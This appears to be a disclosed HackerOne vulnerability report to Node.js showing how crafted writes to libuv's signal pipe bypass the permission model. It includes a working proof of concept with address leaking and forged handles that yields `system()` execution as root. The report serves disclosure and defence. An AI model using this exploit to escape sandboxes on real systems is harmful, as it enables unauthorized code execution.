{
  "id": 2260337,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjYwMzM3",
  "url": "https://hackerone.com/reports/2260337",
  "title": "Permissions can be bypassed via arbitrary code execution through abusing libuv signal pipes",
  "state": "Closed",
  "substate": "informative",
  "readable_substate": "Informative",
  "created_at": "2023-11-21T21:18:49.407Z",
  "submitted_at": "2023-11-21T21:26:51.903Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "xion",
    "url": "/xion",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2024-08-08T15:38:05.530Z",
  "bug_reporter_agreed_on_going_public_at": "2024-08-08T15:38:05.361Z",
  "team_member_agreed_on_going_public_at": "2024-08-08T13:23:41.461Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:**\n\nSending specific crafted messages to Node.js libuv signal event pipe allows an attacker to obtain arbitrary code execution primitives, bypassing any module-based permissions and process-based permissions enforced.\n\n**Description:**\n\nNode.js uses [libuv](https://github.com/libuv/libuv) which uses pipes to signal and handle events in order to support asynchronous I/O event loops. As communication between pipes are trusted it is possible to send a specific crafted message to the pipe to obtain arbitrary code execution, bypassing any module-based permissions and process-based permissions enforced.\n\nThis vulnerability is reproducible even under the most restrictive policies (module-based permissions) and permission models (process-based permissions) available on latest Node.js version.\n\n## Steps To Reproduce:\n\n1. Download and untar {F2874430}. This is a Dockerized repro based on `node:20.9.0-alpine3.17` image on digest `sha256:b82ef5b38a306323dfcce05eb0d60bc568d7cf69967afb21bd42d7deaecd558e`.\n\n```text\n$ tar xvf repro.tar.gz\ncode.js\nDockerfile\npolicy.json\nrun.sh\n```\n\n2. Run `./run.sh`. This will build the repro image and run the container, where the exploit code `code.js` runs within the most restrictive policies and permissions model possible.\n   - Module-based permissions: No dependencies allowed for the exploit code\n   - Process-based permissions: `allow-fs-read` only for two files, policy file `/policy.json` and exploit code `/code.js`.\n   - Additional flags such as `--noexpose_wasm` to additionally remove trivial attack vectors (WASI)\n\n```text\n$ ./run.sh\n[+] Building 0.0s (7/7) FINISHED                                                                                                                                                         docker:default\n => [internal] load .dockerignore                                                                                                                                                                  0.0s\n => => transferring context: 2B                                                                                                                                                                    0.0s\n => [internal] load build definition from Dockerfile                                                                                                                                               0.0s\n => => transferring dockerfile: 592B                                                                                                                                                               0.0s\n => [internal] load metadata for docker.io/library/node:20.9.0-alpine3.17@sha256:b82ef5b38a306323dfcce05eb0d60bc568d7cf69967afb21bd42d7deaecd558e                                                  0.0s\n => [internal] load build context                                                                                                                                                                  0.0s\n => => transferring context: 2.10kB                                                                                                                                                                0.0s\n => [1/2] FROM docker.io/library/node:20.9.0-alpine3.17@sha256:b82ef5b38a306323dfcce05eb0d60bc568d7cf69967afb21bd42d7deaecd558e                                                                    0.0s\n => CACHED [2/2] COPY code.js policy.json /                                                                                                                                                        0.0s\n => exporting to image                                                                                                                                                                             0.0s\n => => exporting layers                                                                                                                                                                            0.0s\n => => writing image sha256:b8194f61f74b5dcaa9cca0ecb47d102b9db14dc9285b7443a1c0f3b017285b1a                                                                                                       0.0s\n => => naming to docker.io/library/repro                                                                                                                                                           0.0s\nbuf:  0x7fe5a0a297c0\nmusl: 0x7fe5a3702000\ngo!\ndone!\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n```\n\n{F2874191}\n\n## Analysis:\n\nThis is a step-by-step in-depth analysis of the exploit.\n\n1. Triggering the libuv crash\n\nWe first identify the vulnerability by triggering a crash from libuv. Running the following immediately yields a crash (if the host supports io_uring). If not, try it with `11` instead of `15` for the first argument (if host does not support io_uring, 4 fds not opened).\n\n```text\n$ node --version\nv20.9.0\n$ node -e 'process.stdout.constructor(15); process.stdout.write(new Uint8Array(new BigUint64Array([0x133700000000n, 0x133800000000n]).buffer));'\nSegmentation fault (core dumped)\n```\n\n`process.stdout.constructor` refers to [WriteStream](https://github.com/nodejs/node/blob/v20.9.0/lib/tty.js#L84). Calling this function with `15` indicates that we create a new `TTY` object with file descriptor set to `15`, and set this as stdout. This effectively changes all following stdout writes to write on fd `15` instead of the original fd `1`.\n\n```js\n// lib/tty.js#L84\nfunction WriteStream(fd) {\n  if (!(this instanceof WriteStream))\n    return new WriteStream(fd);\n  if (fd >> 0 !== fd || fd < 0)\n    throw new ERR_INVALID_FD(fd);\n\n  const ctx = {};\n  const tty = new TTY(fd, ctx);\n  if (ctx.code !== undefined) {\n    throw new ERR_TTY_INIT_FAILED(ctx);\n  }\n\n  net.Socket.call(this, {\n    readableHighWaterMark: 0,\n    handle: tty,\n    manualStart: true,\n  });\n```\n\nWe can verify this by strace:\n\n```\n$ strace node -e 'process.stdout.constructor(15); process.stdout.write(new Uint8Array(new BigUint64Array([0x133700000000n, 0x133812345678n]).buffer));'\n// omitted\nioctl(15, TCGETS, 0x7ffcdd0a5380)       = -1 ENOTTY (Inappropriate ioctl for device)\nfstat(15, {st_mode=S_IFIFO|0600, st_size=0, ...}) = 0\nfcntl(15, F_GETFL)                      = 0x801 (flags O_WRONLY|O_NONBLOCK)\nioctl(15, FIONBIO, [1])                 = 0\nioctl(15, FIONBIO, [0])                 = 0\nioctl(15, TIOCGWINSZ, 0x7ffcdd0a5708)   = -1 ENOTTY (Inappropriate ioctl for device)\nwrite(15, \"\\0\\0\\0\\0007\\23\\0\\0xV4\\228\\23\\0\\0\", 16) = 16\n+++ killed by SIGSEGV (core dumped) +++\nSegmentation fault (core dumped)\n```\n\nThe constructor call results in fd `15` to be considered as stdout tty fd. It responds with `ENOTTY` on some tty-related ioctls but still continues fine until `process.stdout.write()` call sends the payload. This results in a segfault.\n\n2. Identifying the segfault\n\nTo identify why we have crashed, we first check what fd `15` is. Below is a list of file descriptors for a reference Node.js process.\n\n```text\n$ ls -alF /proc/10530/fd/\ntotal 0\ndr-x------ 2 root root 28 Nov 22 03:54 ./\ndr-xr-xr-x 9 root root  0 Nov 22 03:54 ../\nlrwx------ 1 root root 64 Nov 22 03:54 0 -> /dev/pts/0\nlrwx------ 1 root root 64 Nov 22 03:54 1 -> /dev/pts/0\nlrwx------ 1 root root 64 Nov 22 03:54 10 -> 'anon_inode:[eventfd]'\nlrwx------ 1 root root 64 Nov 22 03:54 11 -> 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Nov 22 03:54 12 -> 'anon_inode:[io_uring]'\nlrwx------ 1 root root 64 Nov 22 03:54 13 -> 'anon_inode:[io_uring]'\nlr-x------ 1 root root 64 Nov 22 03:54 14 -> 'pipe:[117933]'\nl-wx------ 1 root root 64 Nov 22 03:54 15 -> 'pipe:[117933]'\nlrwx------ 1 root root 64 Nov 22 03:54 16 -> 'anon_inode:[eventfd]'\nlrwx------ 1 root root 64 Nov 22 03:54 17 -> 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Nov 22 03:54 18 -> 'anon_inode:[io_uring]'\nlrwx------ 1 root root 64 Nov 22 03:54 19 -> 'anon_inode:[io_uring]'\nlrwx------ 1 root root 64 Nov 22 03:54 2 -> /dev/pts/0\nlr-x------ 1 root root 64 Nov 22 03:54 20 -> 'pipe:[104958]'\nl-wx------ 1 root root 64 Nov 22 03:54 21 -> 'pipe:[104958]'\nlrwx------ 1 root root 64 Nov 22 03:54 22 -> 'anon_inode:[eventfd]'\nlrwx------ 1 root root 64 Nov 22 03:54 23 -> /dev/pts/0\nlr-x------ 1 root root 64 Nov 22 03:54 24 -> /dev/null\nlrwx------ 1 root root 64 Nov 22 03:54 25 -> /dev/pts/0\nlrwx------ 1 root root 64 Nov 22 03:54 26 -> /dev/pts/0\nlrwx------ 1 root root 64 Nov 22 03:54 3 -> 'anon_inode:[eventpoll]'\nlrwx------ 1 root root 64 Nov 22 03:54 4 -> 'anon_inode:[io_uring]'\nlrwx------ 1 root root 64 Nov 22 03:54 5 -> 'anon_inode:[io_uring]'\nlr-x------ 1 root root 64 Nov 22 03:54 6 -> 'pipe:[104952]'\nl-wx------ 1 root root 64 Nov 22 03:54 7 -> 'pipe:[104952]'\nlr-x------ 1 root root 64 Nov 22 03:54 8 -> 'pipe:[104953]'\nl-wx------ 1 root root 64 Nov 22 03:54 9 -> 'pipe:[104953]'\n```\n\nWe see that fd `15` corresponds to a pipe's writer side fd, with its corresponding reader side fd on `14`.\n\nWe then check the crash site via gdb, which reveals that we have crash at the following [libuv code](https://github.com/nodejs/node/blob/v20.9.0/deps/uv/src/unix/signal.c#L461):\n\n```c\n// deps/uv/src/unix/signal.c#L35\ntypedef struct {\n  uv_signal_t* handle;\n  int signum;\n} uv__signal_msg_t;\n\n// deps/uv/src/unix/signal.c#L431\n    r = read(loop->signal_pipefd[0], buf + bytes, sizeof(buf) - bytes);\n\n// deps/uv/src/unix/signal.c#L457\n    for (i = 0; i < end; i += sizeof(uv__signal_msg_t)) {\n      msg = (uv__signal_msg_t*) (buf + i);\n      handle = msg->handle;\n\n      if (msg->signum == handle->signum) {                // crash on handle->signum dereference\n        assert(!(handle->flags & UV_HANDLE_CLOSING));\n        handle->signal_cb(handle, handle->signum);\n      }\n\n      handle->dispatched_signals++;\n\n      if (handle->flags & UV_SIGNAL_ONE_SHOT)\n        uv__signal_stop(handle);\n    }\n```\n\nWe now see that this is the pipe reader side code for fd `14`. As we have sent `new BigUint64Array([0x133700000000n, 0x133812345678n])` from our test code, `handle` is now `0x133700000000` and `msg->signum == 0x12345678`.  libuv segfaulted on this `handle` value.\n\nNote that if we have a controlled data on known address, we can easily make this an arbitrary function call. This is because we can point `handle` to the known address, satisfy the `msg->signum == handle->signum` constraint as well as the `assert()` call to reach `handle->signal_cb(handle, handle->signum)`. `handle->signal_cb` is our controlled data, and what's also good is that the first argument is `handle` itself - it would be best if we can make this into an arbitrary `system(cmd)` call.\n\n3. Leaking addresses\n\nFor node binaries linked to glibc PIE seems to be disabled, which allows exploiting the binary in a easier manner as the node binary address is fixed. This is not the case for other node binaries, for example musl-linked node used for alpine-based Node.js docker images. Thus to exploit the vulnerability to obtain a full `system(cmd)` call, the exploit must first leak addresses.\n\nLeaking addresses are easily done by using [uninitialized `Buffer`](https://nodejs.org/docs/latest-v20.x/api/buffer.html). After depleting the initial `Buffer` pool by allocating [~0x2000 bytes](https://github.com/nodejs/node/blob/v20.9.0/lib/buffer.js#L150), we receive a new pool that is filled with garbage data that the previous allocations have used.\n\nThis leaks the `Buffer` backing memory address at index 6, and an address at index 5 which has a constant offset from musl library base.\n\n```js\n// repro/code.js#L28\nconst fill = [];\nfor (let i = 0; i < 0x3f9; i++) {\n    fill.push(Buffer.from(\"A\"));\n}\nconst dump_orig = Buffer.from(\"MARK\").buffer;\nconst dump = Buffer.from(dump_orig);\nconst dump64 = tele(dump);\n\n//console.log(dump64);\n\nconst buf = dump64[6] - 0x20n;\nconsole.log(`buf:  0x${buf.toString(16)}`);\nassert(dump64[4] === 0x007265666675425fn);          // \"_Buffer\"\nassert((buf & 0xfffn) === 0x7c0n);\n\nconst musl = dump64[5] - 0x40a68n + 0x315000n;\nconsole.log(`musl: 0x${musl.toString(16)}`);\nassert((musl & 0xfffn) === 0n);\n```\n\n4. Popping shell\n\nNow that we have leaked the libc base and the address of backing store of a `Buffer`, we can use this to call arbitrary `system(cmd)`. Using `DataView` to modify the `Buffer` contents at known address, we set `handle->signal_cb = system`, `handle->signum == msg->signum` and write our desired command to `handle`. We finally send the payload `sigmsg` to trigger the vulnerability and call arbitrary shell commands. In the repro exploit code, `id > /proc/${process.pid}/fd/1` is called to demonstrate that we have indeed popped shell.\n\n```js\n// repro/code.js#L47\nconst view = new DataView(dump_orig);\nconst sigmsg = new BigUint64Array(0x2);\n\nconst cmd = `id > /proc/${process.pid}/fd/1\\0`;\nassert(cmd.length <= 0x60);\nfor (let i = 0; i < cmd.length; i++) {\n    view.setUint8(i, cmd.charCodeAt(i));\n}\nview.setBigUint64(0x60, ntoh(musl + 0x423a1n));     // handle->signal_cb = system\nview.setBigUint64(0x68, ntoh(0x1337c0d3n));         // handle->signum = 0x1337c0d3\n\nsigmsg[0] = buf;                                    // handle = buf\nsigmsg[1] = 0x1337c0d3n;                            // msg->signum = 0x1337c0d3\n\nconsole.log('go!');\nprocess.on('exit', () => {\n    process.stdout.constructor(1);\n    process.stdout.write(\"done!\\n\");\n});\ntry {\n    process.stdout.constructor(11);\t// no io_uring\n} catch {\n    process.stdout.constructor(15);     // supports io_uring\n}\nprocess.stdout.write(new Uint8Array(sigmsg.buffer));\nprocess.exit();\n```\n\n**Fix:**\n\nThere are multiple factors to consider when fixing this vulnerability:\n1. Filesystem permissions for process-based permissions currently do not implement any defense against already opened file descriptors, implicitly trusting them to be within the enforced permission model. This report proves that this is not the case.\n2. Even after exhaustively implementing proper filesystem permissions over already opened file descriptors on `node:fs`, there may be other ways to interact with file descriptor. This report shows one case of using `process.{stdin,stdout,stderr}.constructor` to reset a TTY, enabling arbitrary writes on any file descriptors. It is difficult to check whether or not we've covered all cases.\n\nAs such, the reporter currently does not have a concrete idea on a comprehensive fix. Minimizing attack surface by denying access to `process` may be a good starting point.\n\n## Impact\n\nThis vulnerability allows attackers to bypass the experimental permission model and gain arbitrary code execution, even under the most restrictive policies and permission models currently available.",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2874191,
      "file_name": "poc.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4j37sblnpzwcxeeolnsqk8zciyku?response-content-disposition=attachment%3B%20filename%3D%22poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQREMC7CON%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T182541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCW8SxQKgARnLryAh2r4n3odN%2B7zqFhHLBFpGvgAn4XGQIhALV8j%2BDSVqm9UmUGt2DO4qp5pLHNIMOJpyo%2BQr4jZzIdKrsFCO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzz%2FcwnvkPCLs%2Bn6ygqjwV3N4a%2FZ0EATSX1wO%2Bd%2F9a4sFO6Mt858m3ydeh4j2%2BqqKgVb9fLUqWZQ3Xmx8UrY2Jf77ASqF10QqWvu5mjhlL%2F6cJVHqOqGfS1YHTxePFExVYWJW0mX9DONhiwDrcFQLe6DMPyTeYR9bFqemJKpl4W0Lq0mBgjk2J9L7vjh9lmdSMB4mW4bwDlytP%2B2OOXnfUPo0Ue3CLKUgn7VKZPMNGMod8rA1p1Nj2o8GDxDQz8S9B9GWeiNrQfKMx1j1yZzUmUiJWYYZg6VPKQd%2Fh6zYAbXPqMB%2B%2BeYrNZaOFzPzwOG7lz3sie7Zq7J2P4WTqz7cIDi8ljg%2BXpQNu1NXVgFuLw05lTmJyAurl8%2F7XqwxcAr%2F3WyKzTA%2BN3MidnphMoj9k0FIhqGYXLon9kWmvgmOuS2N%2Bi1Bz6dFV%2FFoCh0inpBfQQf6i10%2FwuwAsDIqOnV%2F%2BsA6UQx0nIY1BZz%2Fu43hkfkcs%2B4emD%2BwTox%2BXml7bT3PyhNAONbvlX%2BjYFGSsu7%2BIT82VvjaOHI4IsYtryLUHHku1lde74QudXzS5Am6sbCGdn28GddjTRySk0O1VctM8gf7kLszOuunYtzmI%2F60PGxa8%2FKfHIIzYH0xHPgB7ZyjWCrbq78RXvAoyRnfnKzgDeuPP6kt%2Fmw%2Bn55w2gkhfYV8yWgFq44AQd%2FO7GQhS6uYp0kYsYocWSYyXa8aaKrcll4f1tA6oisyBTb5pzXLwukKj8q7hpMQCyXrKYULgrq1rwLMpUhMi91AEHWm%2FLmP8LtrrYdGaptsjtLzHdKzyfuCGCmmDyXS2O7gkVx3S3TIPZ8BlVvBNPeFh%2FY2AILsegfWYoGHx2Q6h3aohdbdWqAHWRhkqdFirzl%2BWKCUAzMI3ausYGOrABMUFpfpVhbtSigmBVkvXCN%2FGp5olQ43QMjeJxuPdkJr0Fk%2FUK2lCX0avcZTMgAcB8v%2FQrrd3%2Bl%2BHr0R%2FBCDD9ZgoXNh5Bs%2Bt6BlNJOLEuPeXscn3g%2FxGeNJRbaq1iW9c2cGZgqYwCB4eSCi3VOE7kvGz8sbUTPOdQOuINtDKGv%2BBSVbxIVtIkLo0cDeLpp621mg%2F4Mrq6KjHRapHnYIEjGudjLEEElfe0kgRyJajdUUw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3cae0b1af41c7fd13fde040f78a8458ced0e6a0d649c402a9f8e2c78a90572d6",
      "file_size": 453755,
      "type": "video/mp4",
      "moderated": null
    },
    {
      "id": 2874430,
      "file_name": "repro.tar.gz",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/cbo0vgixpb68abr1piuh569399la?response-content-disposition=attachment%3B%20filename%3D%22repro.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27repro.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQREMC7CON%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T182541Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQCW8SxQKgARnLryAh2r4n3odN%2B7zqFhHLBFpGvgAn4XGQIhALV8j%2BDSVqm9UmUGt2DO4qp5pLHNIMOJpyo%2BQr4jZzIdKrsFCO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzz%2FcwnvkPCLs%2Bn6ygqjwV3N4a%2FZ0EATSX1wO%2Bd%2F9a4sFO6Mt858m3ydeh4j2%2BqqKgVb9fLUqWZQ3Xmx8UrY2Jf77ASqF10QqWvu5mjhlL%2F6cJVHqOqGfS1YHTxePFExVYWJW0mX9DONhiwDrcFQLe6DMPyTeYR9bFqemJKpl4W0Lq0mBgjk2J9L7vjh9lmdSMB4mW4bwDlytP%2B2OOXnfUPo0Ue3CLKUgn7VKZPMNGMod8rA1p1Nj2o8GDxDQz8S9B9GWeiNrQfKMx1j1yZzUmUiJWYYZg6VPKQd%2Fh6zYAbXPqMB%2B%2BeYrNZaOFzPzwOG7lz3sie7Zq7J2P4WTqz7cIDi8ljg%2BXpQNu1NXVgFuLw05lTmJyAurl8%2F7XqwxcAr%2F3WyKzTA%2BN3MidnphMoj9k0FIhqGYXLon9kWmvgmOuS2N%2Bi1Bz6dFV%2FFoCh0inpBfQQf6i10%2FwuwAsDIqOnV%2F%2BsA6UQx0nIY1BZz%2Fu43hkfkcs%2B4emD%2BwTox%2BXml7bT3PyhNAONbvlX%2BjYFGSsu7%2BIT82VvjaOHI4IsYtryLUHHku1lde74QudXzS5Am6sbCGdn28GddjTRySk0O1VctM8gf7kLszOuunYtzmI%2F60PGxa8%2FKfHIIzYH0xHPgB7ZyjWCrbq78RXvAoyRnfnKzgDeuPP6kt%2Fmw%2Bn55w2gkhfYV8yWgFq44AQd%2FO7GQhS6uYp0kYsYocWSYyXa8aaKrcll4f1tA6oisyBTb5pzXLwukKj8q7hpMQCyXrKYULgrq1rwLMpUhMi91AEHWm%2FLmP8LtrrYdGaptsjtLzHdKzyfuCGCmmDyXS2O7gkVx3S3TIPZ8BlVvBNPeFh%2FY2AILsegfWYoGHx2Q6h3aohdbdWqAHWRhkqdFirzl%2BWKCUAzMI3ausYGOrABMUFpfpVhbtSigmBVkvXCN%2FGp5olQ43QMjeJxuPdkJr0Fk%2FUK2lCX0avcZTMgAcB8v%2FQrrd3%2Bl%2BHr0R%2FBCDD9ZgoXNh5Bs%2Bt6BlNJOLEuPeXscn3g%2FxGeNJRbaq1iW9c2cGZgqYwCB4eSCi3VOE7kvGz8sbUTPOdQOuINtDKGv%2BBSVbxIVtIkLo0cDeLpp621mg%2F4Mrq6KjHRapHnYIEjGudjLEEElfe0kgRyJajdUUw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=02c4d9dbe968980e31971234f1e6d22b6675b3641d79798abe880594fc6c3083",
      "file_size": 1444,
      "type": "application/gzip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 20,
  "voters": [
    "triiokta",
    "g3ksec",
    "zy9ard3",
    "pin0ccs",
    "ro1bo2ts3txt",
    "gitsjsons",
    "haboob_chaser",
    "bajablast",
    "root_panggang",
    "steadfast_inf0sec",
    "and 10 more..."
  ],
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
